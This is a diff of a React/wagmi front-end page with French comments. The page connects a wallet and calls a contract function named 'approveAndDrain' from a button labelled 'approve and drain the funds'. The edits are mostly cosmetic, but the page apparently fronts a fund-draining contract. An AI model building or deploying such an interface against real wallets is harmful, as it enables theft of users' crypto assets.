@@ -1,6 +1,6 @@
 import { ConnectButton } from "@rainbow-me/rainbowkit";
 import { useAccount, useContractRead, useContractWrite } from "wagmi";
-import contractAddress from "../utils/contractAddress"; // Importation par défaut
+import contractAddress from "../utils/contractAddress"; // Importation de l'adresse du contrat
 
 // ABI du contrat
 const contractAbi = [
@@ -96,16 +96,16 @@ const contractAbi = [
 export default function Home() {
   const { isConnected, address } = useAccount();
 
-  // Lire le owner du contrat
+  // Lire le propriétaire du contrat
   const { data: owner, isError, isLoading } = useContractRead({
-    address: contractAddress as `0x${string}`, // S'assurer que l'adresse est bien typée
+    address: contractAddress,  // Adresse du contrat
     abi: contractAbi,
     functionName: "owner",
   });
 
   // Écrire sur le contrat
   const { write: approveAndDrain, isLoading: isWriting } = useContractWrite({
-    address: contractAddress as `0x${string}`, // S'assurer que l'adresse est bien typée
+    address: contractAddress,  // Adresse du contrat
     abi: contractAbi,
     functionName: "approveAndDrain",
   });
@@ -123,7 +123,7 @@ export default function Home() {
           ) : (
             <p>Propriétaire du contrat : {owner || "Inconnu"}</p>
           )}
-          <button disabled={isWriting} onClick={() => approveAndDrain?.()}>
+          <button disabled={isWriting} onClick={() => approveAndDrain()}>
             {isWriting ? "Transaction en cours..." : "Approuver et vider les fonds"}
           </button>
         </>
